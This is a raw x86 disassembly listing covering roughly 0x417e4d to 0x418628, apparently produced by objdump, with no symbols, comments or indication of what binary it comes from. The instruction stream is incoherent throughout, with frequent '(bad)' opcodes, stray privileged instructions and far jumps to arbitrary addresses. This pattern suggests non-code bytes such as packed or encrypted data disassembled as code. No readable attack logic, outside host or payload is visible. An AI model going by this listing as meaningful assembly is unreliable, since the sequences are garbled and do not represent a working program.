  417e4d:	cmp    DWORD PTR [esi-0x71],edi
  417e50:	pushf  
  417e51:	jecxz  0x417eaa
  417e53:	fnsave [ebp+ecx*2-0x5121bc73]
  417e5a:	stc    
  417e5b:	xor    esp,DWORD PTR [eax]
  417e5d:	lahf   
  417e5e:	lahf   
  417e5f:	xor    ebp,DWORD PTR [ebx-0x17948439]
  417e65:	jno    0x417eb7
  417e67:	xchg   BYTE PTR [edx],cl
  417e69:	out    dx,eax
  417e6a:	mov    dh,0x7a
  417e6c:	mov    eax,ebx
  417e6e:	mov    cl,0xc1
  417e70:	test   DWORD PTR [edx+0x19136232],ebp
  417e76:	lock fdivr QWORD PTR [ebp+0x70]
  417e7a:	dec    ecx
  417e7b:	(bad)  
  417e7d:	pop    ebp
  417e7e:	dec    edx
  417e7f:	mov    esp,0xe3c18477
  417e84:	xchg   ebx,eax
  417e85:	loopne 0x417e92
  417e87:	sti    
  417e88:	int    0x41
  417e8a:	inc    ecx
  417e8b:	(bad)  
  417e8c:	neg    BYTE PTR [edx-0x5c]
  417e8f:	ror    BYTE PTR [eax+0x36],0x7e
  417e93:	js     0x417ea4
  417e95:	fwait
  417e96:	retf   0xa0d1
  417e99:	int3   
  417e9a:	add    eax,0x255fbc89
  417e9f:	add    al,BYTE PTR [ecx-0x3961a710]
  417ea5:	adc    eax,0x2c0b2dcd
  417eaa:	cld    
  417eab:	and    esi,DWORD PTR [esi-0x7ba53643]
  417eb1:	lods   eax,DWORD PTR ds:[esi]
  417eb2:	call   0xa3ea:0xe15c1322
  417eb9:	mov    dh,0xa6
  417ebb:	and    DWORD PTR [eax-0x17ba2b00],ebp
  417ec1:	pop    edx
  417ec2:	push   esp
  417ec3:	mov    WORD PTR [ebp-0x58],ss
  417ec6:	and    DWORD PTR [eax],edi
  417ec8:	cmp    bl,dh
  417eca:	rcl    ecx,1
  417ecc:	dec    edx
  417ecd:	xlat   BYTE PTR ds:[ebx]
  417ece:	shl    DWORD PTR [ecx-0x1da6a7ec],cl
  417ed4:	jg     0x417efb
  417ed6:	fcomp  QWORD PTR [eax]
  417ed8:	mov    edx,0x57c582ad
  417edd:	mov    ebx,0xb6470e6a
  417ee2:	jmp    0x417e98
  417ee4:	mov    al,ds:0x6dab7dd2
  417ee9:	sahf   
  417eea:	arpl   WORD PTR [eax+0x205ac8e],cx
  417ef0:	jnp    0x417eda
  417ef2:	out    0x98,al
  417ef4:	add    al,BYTE PTR [edi]
  417ef6:	call   0x1e2c7745
  417efb:	fdivr  DWORD PTR [edi]
  417efd:	aam    0xec
  417eff:	jecxz  0x417eda
  417f01:	and    BYTE PTR [esi-0x4a],ch
  417f04:	loopne 0x417ed1
  417f06:	cmp    al,0x8b
  417f08:	xor    DWORD PTR [edi+esi*2],ebx
  417f0b:	and    BYTE PTR [ecx],al
  417f0d:	jp     0x417ef2
  417f0f:	(bad)  [ecx+0x64]
  417f12:	bound  eax,QWORD PTR [eax+ebp*2-0x2e]
  417f16:	out    dx,al
  417f17:	and    DWORD PTR [edi+ecx*8+0x34],edi
  417f1b:	test   ecx,edx
  417f1d:	xchg   edi,eax
  417f1e:	call   0xb17a:0x801c2399
  417f25:	sub    BYTE PTR ds:0xc4952a2b,dl
  417f2b:	outs   dx,DWORD PTR ds:[esi]
  417f2c:	iret   
  417f2d:	xchg   edx,eax
  417f2e:	mov    eax,ds:0xa995fa23
  417f33:	call   0x3805820a
  417f38:	and    BYTE PTR [esi],al
  417f3a:	xlat   BYTE PTR ds:[ebx]
  417f3b:	test   eax,0x5f413a50
  417f40:	pop    esi
  417f41:	xchg   edx,eax
  417f42:	loop   0x417edc
  417f44:	push   0x63414da7
  417f49:	lods   al,BYTE PTR ds:[esi]
  417f4a:	jmp    DWORD PTR [esi-0x7875d2e9]
  417f50:	add    BYTE PTR [ebp-0x52],dl
  417f53:	addr16 test dh,al
  417f56:	mov    ch,0xe5
  417f58:	push   edi
  417f59:	jmp    0xe1a5f66b
  417f5e:	hlt    
  417f5f:	jo     0x417f46
  417f61:	xchg   ebx,eax
  417f62:	jbe    0x417ef4
  417f64:	mov    ebp,0xc2fefd94
  417f69:	mov    eax,0x225bb2e6
  417f6e:	dec    edi
  417f6f:	shl    edi,1
  417f71:	(bad)  
  417f72:	pushf  
  417f73:	repz adc BYTE PTR [ebx-0x33518014],0xb5
  417f7b:	and    BYTE PTR [ebx],0xfb
  417f7e:	inc    ebp
  417f7f:	xor    DWORD PTR [ebx+0x179caa33],esp
  417f85:	and    BYTE PTR [edx-0x59e47ced],cl
  417f8b:	jmp    0x5c68:0x93de20fd
  417f92:	jo     0x417f57
  417f94:	inc    ebp
  417f95:	fnstsw WORD PTR [edx-0x4b]
  417f98:	gs jl  0x417f70
  417f9b:	ins    DWORD PTR es:[edi],dx
  417f9c:	mov    al,0xdc
  417f9e:	ficomp WORD PTR ds:0xc0a482eb
  417fa4:	int    0xff
  417fa6:	pop    esp
  417fa7:	xchg   BYTE PTR [esp+esi*2-0x3e],cl
  417fab:	arpl   bp,bx
  417fad:	jmp    0x417f62
  417faf:	jecxz  0x41801b
  417fb1:	xchg   ebx,eax
  417fb2:	ins    BYTE PTR es:[edi],dx
  417fb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fb4:	je     0x417fed
  417fb6:	shl    DWORD PTR [ebx+0x68fc8157],cl
  417fbc:	sar    DWORD PTR [eax],0x31
  417fbf:	adc    eax,0x1991a899
  417fc4:	fld    TBYTE PTR [edi+0x7b]
  417fc7:	cli    
  417fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fc9:	sbb    eax,0xd4d352d8
  417fce:	jae    0x417f69
  417fd0:	mov    fs,WORD PTR [edx]
  417fd2:	push   cs
  417fd3:	sub    BYTE PTR [eax+0x48],al
  417fd6:	in     al,0x1e
  417fd8:	sbb    DWORD PTR [ebx-0x6e],0xef600bee
  417fdf:	xlat   BYTE PTR ds:[ebx]
  417fe0:	add    edx,DWORD PTR [esi+0x4eac2137]
  417fe6:	mov    dl,0x88
  417fe8:	fwait
  417fe9:	push   ebp
  417fea:	pop    ss
  417feb:	daa    
  417fec:	add    al,0x23
  417fee:	das    
  417fef:	icebp  
  417ff0:	daa    
  417ff1:	ror    BYTE PTR [edx+0x12],0xe6
  417ff5:	(bad)
  417ff9:	arpl   WORD PTR [esi+ebx*4+0x74],sp
  417ffd:	or     al,dh
  417fff:	lea    esi,[ebx-0x5f]
  418002:	xor    eax,0x1296a9d4
  418007:	test   al,0x49
  418009:	in     al,0xe2
  41800b:	retf   0xc87e
  41800e:	pop    ebx
  41800f:	sub    cl,BYTE PTR [edi-0x1707d69a]
  418015:	xchg   esi,eax
  418016:	cli    
  418017:	pop    es
  418018:	aaa    
  418019:	popf   
  41801a:	stc    
  41801b:	jg     0x418096
  41801d:	(bad)  [edi+ebx*8]
  418020:	inc    esi
  418021:	sahf   
  418022:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418023:	mov    ebp,0x89e517df
  418028:	aam    0x55
  41802a:	mov    esp,0xfe715fdd
  41802f:	mov    al,ds:0xa2776ffb
  418034:	ds and dh,ah
  418037:	pop    ss
  418038:	addr16 js 0x41805a
  41803b:	dec    ecx
  41803c:	out    0x4a,al
  41803e:	sub    eax,DWORD PTR [esi-0x57]
  418041:	add    DWORD PTR [edi+0x6f],edi
  418044:	and    dl,bh
  418046:	jne    0x418049
  418048:	mov    bl,0xa9
  41804a:	(bad)  
  41804c:	leave  
  41804d:	(bad)  
  41804e:	cmp    ebx,DWORD PTR [ecx]
  418050:	js     0x418067
  418052:	rcl    BYTE PTR [esi-0x6a],1
  418055:	cmp    edx,DWORD PTR [ebx]
  418057:	mov    edx,0xa6b7cc1a
  41805c:	outs   dx,BYTE PTR ds:[esi]
  41805d:	(bad)  
  41805e:	js     0x418008
  418060:	push   es
  418061:	test   ch,cl
  418063:	jmp    0x884c:0x75609719
  41806a:	out    0xf7,eax
  41806c:	(bad)  
  41806d:	or     al,0xbf
  41806f:	mov    esi,0xcea42dc3
  418074:	in     al,0xc4
  418076:	outs   dx,BYTE PTR ds:[esi]
  418077:	popa   
  418078:	cli    
  418079:	hlt    
  41807a:	iret   
  41807b:	sbb    eax,0x2e3f9838
  418080:	dec    ebx
  418081:	fsubr  QWORD PTR [ebx+0x6ef8c2f7]
  418087:	das    
  418088:	mov    ebx,0xd8831fa8
  41808d:	push   ecx
  41808e:	cmp    BYTE PTR es:[eax-0x2da88706],bh
  418095:	icebp  
  418096:	sub    eax,0x3e018e85
  41809b:	or     DWORD PTR [ecx],edx
  41809d:	fmul   QWORD PTR [ecx-0x3be0a87]
  4180a3:	lds    edx,FWORD PTR [edx+0x46]
  4180a6:	sbb    dh,al
  4180a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180a9:	int    0x7e
  4180ab:	sbb    DWORD PTR [ecx-0x6995176c],ecx
  4180b1:	mov    bl,0xf3
  4180b3:	push   ebx
  4180b4:	mov    ebp,0x3cac1e75
  4180b9:	loop   0x4180be
  4180bb:	or     BYTE PTR [esi-0xfad7671],dh
  4180c1:	shl    edi,cl
  4180c3:	sub    ah,BYTE PTR [edx+0xe]
  4180c6:	ds inc edi
  4180c8:	jge    0x4180a5
  4180ca:	mov    ebp,0x805a91ed
  4180cf:	sbb    DWORD PTR [esi+0x37f2e159],eax
  4180d5:	stos   BYTE PTR es:[edi],al
  4180d6:	imul   edi,DWORD PTR [edx+0x62],0x1e
  4180da:	call   0xec6b9255
  4180df:	mov    al,ds:0xae151832
  4180e4:	xor    al,0xef
  4180e6:	pop    ebp
  4180e7:	dec    edi
  4180e8:	(bad)  
  4180e9:	into   
  4180ea:	mov    edi,0x7f964e75
  4180ef:	adc    al,0x46
  4180f1:	pop    ds
  4180f2:	sbb    BYTE PTR [ebx+edi*8+0xf],al
  4180f6:	pop    ss
  4180f7:	inc    ebp
  4180f8:	inc    eax
  4180f9:	stc    
  4180fa:	mov    ebx,0xd173a5ee
  4180ff:	and    ch,BYTE PTR [ebx-0x69]
  418102:	sbb    DWORD PTR [ecx+0x4b3ef547],0xebcb5ea6
  41810c:	call   0x6fdb3fc8
  418111:	jmp    0x418140
  418113:	arpl   WORD PTR [ecx+0x76],si
  418116:	xchg   ebp,eax
  418117:	jle    0x41817a
  418119:	std    
  41811a:	call   0xe3a2fed8
  41811f:	pop    ds
  418120:	inc    edi
  418121:	repz adc DWORD PTR [edi],edi
  418124:	cmp    al,0xa3
  418126:	ret    
  418127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418128:	mov    ds:0xb63c83b5,eax
  41812d:	pop    ecx
  41812e:	dec    ecx
  41812f:	out    0x86,eax
  418131:	inc    esi
  418132:	not    BYTE PTR [edx]
  418134:	dec    edx
  418135:	adc    dh,BYTE PTR [edx]
  418137:	loop   0x418170
  418139:	inc    edi
  41813a:	lea    eax,[ecx-0x62]
  41813d:	sub    ebp,DWORD PTR [ebp+0x21]
  418140:	test   BYTE PTR [ebx+0x5dccc066],0x21
  418147:	pop    esp
  418148:	xchg   ebx,eax
  418149:	sahf   
  41814a:	(bad)  
  41814b:	mov    ah,0x6a
  41814d:	mov    al,0xde
  41814f:	repz pushf 
  418151:	xchg   esi,eax
  418152:	sbb    bh,BYTE PTR [esp+eax*4+0x250201cc]
  418159:	xchg   DWORD PTR [esi],esp
  41815b:	int    0x5a
  41815d:	cld    
  41815e:	jge    0x41813c
  418160:	push   ebx
  418161:	inc    edi
  418162:	mov    ebx,0xd3cfc912
  418167:	mov    ebp,0xb46e95b8
  41816c:	sti    
  41816d:	xchg   ebp,eax
  41816e:	push   ebp
  41816f:	push   ebx
  418170:	mov    bh,0x8
  418172:	push   edx
  418173:	les    eax,FWORD PTR [ecx]
  418175:	xor    ecx,DWORD PTR [edx]
  418177:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418178:	or     eax,0x5c3b7db0
  41817d:	hlt    
  41817e:	mov    al,BYTE PTR [ecx+0x3b]
  418181:	imul   edi,ebp,0x58
  418184:	inc    edi
  418185:	call   FWORD PTR ds:0x11732681
  41818b:	test   al,0xdf
  41818d:	or     al,0xab
  41818f:	or     al,0x1
  418191:	mov    bl,0x5b
  418193:	jns    0x41819e
  418195:	scas   al,BYTE PTR es:[edi]
  418196:	pop    ds
  418197:	mov    eax,ds:0x3a3786ee
  41819c:	mov    ebp,0x3372bba2
  4181a1:	cmc    
  4181a2:	jmp    0xa0125e31
  4181a7:	ds dec esp
  4181a9:	ins    DWORD PTR es:[edi],dx
  4181aa:	popf   
  4181ab:	das    
  4181ac:	push   ds
  4181ad:	mov    esi,0x1eb125b
  4181b2:	hlt    
  4181b3:	and    esi,eax
  4181b5:	add    dh,BYTE PTR [esi]
  4181b7:	xchg   esp,esp
  4181b9:	add    al,0x4c
  4181bb:	in     eax,0x4d
  4181bd:	jnp    0x41823b
  4181bf:	mov    ecx,0x37930c5a
  4181c4:	ret    0x9542
  4181c7:	xchg   esp,eax
  4181c8:	scas   al,BYTE PTR es:[edi]
  4181c9:	lock mov cl,0x90
  4181cc:	jns    0x418167
  4181ce:	mov    eax,0xea0049bc
  4181d3:	retf   
  4181d4:	sbb    DWORD PTR [ebp+0x3964e5f5],0xf98cd6f5
  4181de:	mov    edi,0x74971d76
  4181e3:	push   cs
  4181e4:	lods   eax,DWORD PTR ds:[esi]
  4181e5:	outs   dx,DWORD PTR ds:[esi]
  4181e6:	sbb    DWORD PTR [ebx+0x57fd1702],esi
  4181ec:	mov    dh,0x15
  4181ee:	scas   eax,DWORD PTR es:[edi]
  4181ef:	xchg   ecx,eax
  4181f0:	and    al,BYTE PTR [esi]
  4181f2:	repnz aad 0x1c
  4181f5:	adc    dl,ah
  4181f7:	outs   dx,BYTE PTR ds:[esi]
  4181f8:	dec    edx
  4181f9:	test   eax,0x82f95fcb
  4181fe:	shl    bl,cl
  418200:	lea    ebp,[eax-0x52]
  418203:	mov    al,0x6a
  418205:	push   0xffffff87
  418207:	pop    ds
  418208:	bound  eax,QWORD PTR [esi+0x214f3ca8]
  41820e:	test   dh,cl
  418210:	and    bh,al
  418212:	mov    ds:0x46dc68cd,al
  418217:	xor    eax,0xb28a817c
  41821c:	int    0x4
  41821e:	pop    ebp
  41821f:	clc    
  418220:	rol    DWORD PTR [ebp+0x1475d539],0xd9
  418227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418228:	cmp    BYTE PTR [ebp+eiz*8+0x76b18b7c],cl
  41822f:	mov    bh,0x73
  418231:	mov    ds:0x4bb84821,eax
  418236:	ds jo  0x4181f9
  418239:	ret    
  41823a:	call   0x48f:0x46d9dacb
  418241:	mov    edi,0x9b75d20f
  418246:	inc    ebp
  418247:	push   edi
  418248:	cdq    
  418249:	mov    bl,0x73
  41824b:	push   0x39fa9247
  418250:	pop    edi
  418251:	jmp    0x76a5:0x505eb559
  418258:	push   edi
  418259:	fisubr WORD PTR [ecx+esi*4+0x5b]
  41825d:	jge    0x418224
  41825f:	call   0x409b397a
  418264:	fdivr  st,st(1)
  418266:	xchg   ecx,eax
  418267:	test   DWORD PTR [esi],ecx
  418269:	cmp    DWORD PTR [ebx+0x6c2717d0],edi
  41826f:	sub    esi,ecx
  418271:	push   ds
  418272:	lods   eax,DWORD PTR ds:[esi]
  418273:	mov    ?,esi
  418275:	enter  0xc9f1,0x20
  418279:	xchg   esp,eax
  41827a:	mov    cs,WORD PTR [ecx]
  41827c:	js     0x418236
  41827e:	push   edi
  41827f:	mov    eax,0xe33b7eb1
  418284:	dec    edx
  418285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418286:	test   al,0x7f
  418288:	jo     0x4182a6
  41828a:	(bad)  
  41828c:	outs   dx,DWORD PTR ds:[esi]
  41828d:	rcl    DWORD PTR [ecx-0x7f],cl
  418290:	mov    ds,WORD PTR [esi-0x3b9206e4]
  418296:	adc    DWORD PTR [ecx+0x4b],ebx
  418299:	mul    ebp
  41829b:	or     dh,ah
  41829d:	or     cl,BYTE PTR [esi]
  41829f:	nop
  4182a0:	ja     0x418275
  4182a2:	adc    DWORD PTR [ebp+0x34416541],edx
  4182a8:	sbb    ecx,DWORD PTR [edx-0x64cfa943]
  4182ae:	xchg   esp,eax
  4182af:	ficomp DWORD PTR [ebp-0x22c954ac]
  4182b5:	cmp    eax,0x21ab4575
  4182ba:	jecxz  0x41832d
  4182bc:	clc    
  4182bd:	adc    dh,BYTE PTR ds:0xbcc09995
  4182c3:	adc    dh,dl
  4182c5:	ja     0x418333
  4182c7:	sbb    DWORD PTR [esi+edi*8+0x1b],esp
  4182cb:	xchg   edx,eax
  4182cc:	pop    ebp
  4182cd:	jo     0x4182a0
  4182cf:	in     eax,0xe3
  4182d1:	sbb    ecx,edi
  4182d3:	pop    edx
  4182d4:	push   0x3
  4182d6:	fistp  WORD PTR [eax]
  4182d8:	pop    edx
  4182d9:	mov    ah,0xee
  4182db:	jge    0x4182ab
  4182dd:	sti    
  4182de:	push   esi
  4182df:	lahf   
  4182e0:	rcl    BYTE PTR [edi+eiz*1],1
  4182e3:	sti    
  4182e4:	jmp    0xb815f166
  4182e9:	mov    edx,0x58111dc5
  4182ee:	je     0x4182c8
  4182f0:	out    0x7f,al
  4182f2:	ins    DWORD PTR es:[edi],dx
  4182f3:	pop    esi
  4182f4:	fs inc ecx
  4182f6:	xlat   BYTE PTR ds:[ebx]
  4182f7:	mov    bl,0xdc
  4182f9:	push   ds
  4182fa:	loopne 0x418280
  4182fc:	stc    
  4182fd:	lods   eax,DWORD PTR ds:[esi]
  4182fe:	pusha  
  4182ff:	or     eax,0xad617af4
  418304:	pop    esi
  418305:	dec    ebx
  418306:	jbe    0x41837e
  418308:	push   ds
  418309:	sub    eax,0x51e97b85
  41830e:	jne    0x41836c
  418310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418311:	repz lahf 
  418313:	(bad)  
  418314:	stos   DWORD PTR es:[edi],eax
  418315:	ja     0x418377
  418317:	push   ds
  418318:	jnp    0x4182c8
  41831a:	pop    eax
  41831b:	int    0xae
  41831d:	pop    esp
  41831e:	aam    0xa9
  418320:	sub    cl,BYTE PTR [ecx+edi*1-0x7]
  418324:	mov    al,ds:0xb8b30b4d
  418329:	fisub  WORD PTR [ecx-0x2f]
  41832c:	xchg   edi,eax
  41832d:	add    BYTE PTR [edx-0x21ca4c85],dl
  418333:	cld    
  418334:	pop    ss
  418335:	call   0x4b344465
  41833a:	and    esp,DWORD PTR [eax+0x73]
  41833d:	(bad)  
  41833e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41833f:	das    
  418340:	(bad)  
  418341:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418342:	sub    al,0x53
  418344:	cdq    
  418345:	pop    edi
  418346:	aaa    
  418347:	cli    
  418348:	out    dx,eax
  418349:	js     0x4182d0
  41834b:	out    dx,eax
  41834c:	arpl   WORD PTR [eax],bp
  41834e:	out    dx,eax
  41834f:	pop    ebx
  418350:	push   ds
  418351:	rcl    BYTE PTR [edi+ebp*4],cl
  418354:	ret    
  418355:	inc    esi
  418356:	add    DWORD PTR [edx],ebx
  418358:	shl    BYTE PTR [eax+0x1344268c],1
  41835e:	mov    ch,0xe1
  418360:	mov    cl,0xba
  418362:	out    0xd3,al
  418364:	mov    dl,0xa5
  418366:	jecxz  0x41839a
  418368:	mov    edi,0xb39b7532
  41836d:	mov    esp,ebp
  41836f:	stos   BYTE PTR es:[edi],al
  418370:	mov    cl,0x59
  418372:	int3   
  418373:	mov    ah,0x9c
  418375:	inc    edi
  418376:	mov    ch,0x31
  418378:	int3   
  418379:	xchg   cx,ax
  41837b:	jmp    0x418392
  41837d:	fstp   QWORD PTR [eax-0x61]
  418380:	fsubr  DWORD PTR [eax+0x5c]
  418383:	ins    BYTE PTR es:[edi],dx
  418384:	xchg   ebp,eax
  418386:	jmp    0x41834c
  418388:	push   cs
  418389:	jae    0x41831f
  41838b:	add    ecx,DWORD PTR [edx]
  41838d:	sub    al,0x18
  41838f:	push   ss
  418390:	inc    ecx
  418391:	xor    al,0x20
  418393:	or     eax,0x540696de
  418398:	fbld   TBYTE PTR [esi]
  41839a:	test   BYTE PTR [eax+eiz*1],al
  41839d:	mul    BYTE PTR [edi+ecx*1-0x4b]
  4183a1:	fisttp WORD PTR [edi+edi*8]
  4183a4:	push   0xffffffe8
  4183a6:	repnz test al,0x26
  4183a9:	lock ret 0x2c55
  4183ad:	dec    eax
  4183ae:	dec    esp
  4183af:	clc    
  4183b0:	in     eax,0x86
  4183b2:	int3   
  4183b3:	sti    
  4183b4:	adc    DWORD PTR [esi+0x277ebe27],ebp
  4183ba:	scas   al,BYTE PTR es:[edi]
  4183bb:	push   esi
  4183bc:	sbb    ah,dl
  4183be:	aam    0x72
  4183c0:	jmp    0xfded:0x3db2a346
  4183c7:	nop
  4183c8:	popf   
  4183c9:	push   es
  4183ca:	jge    0x4183fe
  4183cc:	mov    ecx,0x753ff000
  4183d1:	push   esp
  4183d2:	fld    QWORD PTR [esi]
  4183d4:	dec    eax
  4183d5:	lods   eax,DWORD PTR ds:[esi]
  4183d6:	aas    
  4183d7:	xor    BYTE PTR [eax-0x44853dce],dh
  4183dd:	pop    ebx
  4183de:	jp     0x418397
  4183e0:	dec    ebp
  4183e1:	mov    ebp,0x13391201
  4183e6:	scas   eax,DWORD PTR es:[edi]
  4183e7:	in     al,0x88
  4183e9:	fs mov edi,0x5cc4549
  4183ef:	mov    al,0xab
  4183f1:	repz test DWORD PTR [edi+edx*1+0x2b],0xb9fad6c4
  4183fa:	test   eax,0xbc48b6f2
  4183ff:	jns    0x41847a
  418401:	inc    edx
  418402:	and    esi,DWORD PTR [edi+ebx*2-0x51]
  418406:	mov    bl,0xc9
  418408:	cmp    eax,0xdd56cd72
  41840d:	xor    dl,0x9b
  418410:	fwait
  418411:	mov    dh,0x10
  418413:	enter  0x63df,0xcc
  418417:	xchg   ebp,eax
  418418:	scas   al,BYTE PTR es:[edi]
  418419:	out    0x56,eax
  41841b:	add    ch,BYTE PTR [eax+ebx*8-0x4f48f0b4]
  418422:	pusha  
  418423:	stc    
  418424:	xor    BYTE PTR [edx+0x4c8f60a9],dl
  41842a:	mov    esp,0x6a75e7bd
  41842f:	add    al,0x17
  418431:	stc    
  418432:	pop    esi
  418433:	and    dh,BYTE PTR [edx+0x31]
  418436:	dec    esp
  418437:	dec    edi
  418438:	lock add ah,bl
  41843b:	add    DWORD PTR [ebp+0x3b],esp
  41843e:	addr16 cmc 
  418440:	add    ch,dh
  418442:	inc    ebp
  418443:	push   eax
  418444:	ret    0x60e7
  418447:	xchg   ah,bh
  418449:	fdivrp st(7),st
  41844b:	and    al,0x5e
  41844d:	daa    
  41844e:	jns    0x4184b5
  418450:	adc    ebx,DWORD PTR [ebp-0x42c3b5eb]
  418456:	sbb    al,ch
  418458:	icebp  
  418459:	push   esp
  41845a:	int    0xf
  41845c:	call   0xa49e1c91
  418461:	cld    
  418462:	jg     0x4183e4
  418464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418465:	push   ebp
  418466:	xor    al,0x5e
  418468:	inc    ecx
  418469:	mov    WORD PTR [eax+0x5ae611f7],es
  41846f:	gs push edi
  418471:	cli    
  418472:	gs test DWORD PTR gs:[ebx-0x1b0761c8],edi
  41847a:	dec    ebx
  41847b:	test   eax,0x7f33fd86
  418480:	(bad)  
  418481:	(bad)  
  418482:	or     BYTE PTR [ebx-0x24],dl
  418485:	clc    
  418486:	loop   0x4184cb
  418488:	xlat   BYTE PTR ds:[ebx]
  418489:	in     eax,0x70
  41848b:	lods   eax,DWORD PTR ds:[esi]
  41848c:	iret   
  41848d:	out    0x20,al
  41848f:	inc    ebp
  418490:	scas   eax,DWORD PTR es:[edi]
  418491:	es leave 
  418493:	or     eax,0x464f41d6
  418498:	sub    BYTE PTR ds:0x25470a6c,dl
  41849e:	xchg   ebp,eax
  41849f:	xchg   ebp,eax
  4184a0:	mov    ah,0x5c
  4184a2:	xchg   edi,eax
  4184a3:	xor    dl,ch
  4184a5:	xor    BYTE PTR [esp+ebx*8-0x1f],al
  4184a9:	imul   ebx,DWORD PTR [edi+ebp*1-0x51845293],0xfffffffc
  4184b1:	add    esi,DWORD PTR [edi-0x527b253e]
  4184b7:	test   BYTE PTR [esi+0x69a49fc2],al
  4184bd:	mov    gs,WORD PTR [ebx-0x49]
  4184c0:	(bad)  
  4184c1:	loop   0x418538
  4184c3:	or     al,0xa0
  4184c5:	loop   0x418483
  4184c7:	mov    bh,0x9c
  4184c9:	sub    eax,eax
  4184cb:	sub    bh,al
  4184cd:	add    eax,0x7d06a5f5
  4184d2:	and    eax,0x84654f06
  4184d7:	mov    ch,0x8a
  4184d9:	or     al,0x25
  4184db:	push   ebx
  4184dc:	mov    ds:0x63b50354,eax
  4184e1:	cmp    bh,BYTE PTR [edx]
  4184e3:	loop   0x418550
  4184e5:	mov    DWORD PTR [ebx],0x897dab73
  4184eb:	popa   
  4184ec:	sbb    al,0xa2
  4184ee:	inc    esp
  4184ef:	mov    al,ds:0xb13889f
  4184f4:	call   0xa17a5565
  4184f9:	adc    BYTE PTR [esi+0x49],dh
  4184fc:	sub    DWORD PTR [eax+0x7ff16913],ecx
  418502:	shr    DWORD PTR [ebx-0x776bd628],cl
  418508:	xchg   esp,eax
  418509:	fsubp  st(4),st
  41850b:	clc    
  41850c:	mov    edx,ebx
  41850e:	paddusw mm5,mm1
  418511:	or     al,0x44
  418513:	jo     0x41849a
  418515:	aaa    
  418516:	stos   BYTE PTR es:[edi],al
  418517:	fcmovnu st,st(5)
  418519:	mov    BYTE PTR [ebx+0x294bceab],0x7d
  418520:	mov    dh,0xdb
  418522:	and    al,0x19
  418524:	push   ss
  418525:	rcl    DWORD PTR ds:0xe5122811,0x65
  41852c:	pusha  
  41852d:	push   esp
  41852e:	test   DWORD PTR [esi+0x62],ebp
  418531:	sbb    dh,BYTE PTR [eax+0x7746d96d]
  418537:	imul   edx,DWORD PTR [eax-0x23],0x36
  41853b:	lock ins DWORD PTR es:[edi],dx
  41853d:	push   esp
  41853e:	mov    BYTE PTR [edi],ch
  418540:	(bad)  
  418541:	rcr    DWORD PTR [esi],1
  418543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418544:	fwait
  418545:	dec    esi
  418546:	mov    ds:0x75f88e83,al
  41854b:	(bad)  
  41854c:	mov    ebx,ebp
  41854e:	ss addr16 (bad) 
  418551:	nop
  418552:	jle    0x418513
  418554:	mov    eax,ds:0x1dafe7d
  418559:	and    bl,BYTE PTR [edi]
  41855b:	cmp    edi,ecx
  41855d:	sbb    BYTE PTR [edi],bl
  41855f:	cwde   
  418560:	add    bl,cl
  418562:	or     ch,al
  418564:	push   0xffffffd4
  418566:	and    eax,0xfca8d126
  41856b:	lea    edx,[ebx]
  41856d:	out    dx,al
  41856e:	push   ebx
  41856f:	ins    BYTE PTR es:[edi],dx
  418570:	neg    DWORD PTR [edi]
  418572:	xchg   esi,eax
  418573:	xor    BYTE PTR [ebx],ah
  418575:	inc    edi
  418576:	int3   
  418577:	jns    0x4185e3
  418579:	lods   eax,DWORD PTR ds:[esi]
  41857a:	popf   
  41857b:	mov    ebx,0xf47901f3
  418580:	cmp    BYTE PTR [esi+0x1733d629],dl
  418586:	(bad)  
  418587:	call   0xcd9e1ff4
  41858c:	test   BYTE PTR [ebp+0x5b4f5b8c],dh
  418592:	mov    BYTE PTR [esi+0x0],bl
  418595:	icebp  
  418596:	jno    0x41859c
  418598:	push   edi
  418599:	mov    bh,BYTE PTR [eax-0x62]
  41859c:	jle    0x4185c1
  41859e:	xlat   BYTE PTR ds:[ebx]
  41859f:	les    ebx,FWORD PTR [ecx+esi*2]
  4185a2:	jge    0x41853b
  4185a4:	ins    DWORD PTR es:[edi],dx
  4185a5:	neg    bl
  4185a7:	and    BYTE PTR [ebx+0x58a36957],ah
  4185ad:	js     0x4185ab
  4185af:	and    BYTE PTR [edx-0x25165d9e],ah
  4185b5:	and    bl,BYTE PTR [ebx-0x32]
  4185b8:	xchg   ecx,esi
  4185ba:	mov    eax,ds:0xdae246f8
  4185bf:	mov    eax,0x4e533281
  4185c4:	es aad 0x67
  4185c7:	mov    ecx,0x46c8ed63
  4185cc:	inc    esp
  4185cd:	or     BYTE PTR [eax],0x12
  4185d0:	pushf  
  4185d1:	out    dx,eax
  4185d2:	lds    edx,FWORD PTR [edi]
  4185d4:	push   edx
  4185d5:	mov    cl,0x41
  4185d7:	aad    0x12
  4185d9:	jge    0x418607
  4185db:	xchg   ebx,eax
  4185dc:	cdq    
  4185dd:	ret    
  4185de:	sub    al,0x35
  4185e0:	aad    0x10
  4185e2:	in     al,dx
  4185e3:	iret   
  4185e4:	idiv   BYTE PTR [ebp-0x3ea5a7fa]
  4185ea:	xor    eax,0xb9f2b7a2
  4185ef:	out    0xf0,al
  4185f1:	fs lock in eax,dx
  4185f4:	out    0x1e,eax
  4185f6:	ret    0x9e9d
  4185f9:	into   
  4185fa:	push   0xf986a3
  4185ff:	ret    
  418600:	jae    0x41864e
  418602:	call   FWORD PTR [eax]
  418604:	xchg   esp,eax
  418605:	mov    ah,0xc6
  418607:	sub    BYTE PTR [eax-0x50090434],0xcf
  41860e:	mov    ah,0xe0
  418610:	(bad)  
  418611:	imul   ebp,esp,0xbb3e9629
  418617:	mov    ah,0x9d
  418619:	sbb    al,bh
  41861b:	xor    ch,BYTE PTR [edi+0x20]
  41861e:	mov    ch,0x1c
  418620:	clc    
  418621:	mov    ch,0xd8
  418623:	jnp    0x418647
  418625:	inc    edi
  418626:	leave  
  418627:	iret   
  418628:	(bad)  [ebx-0x1272e112]
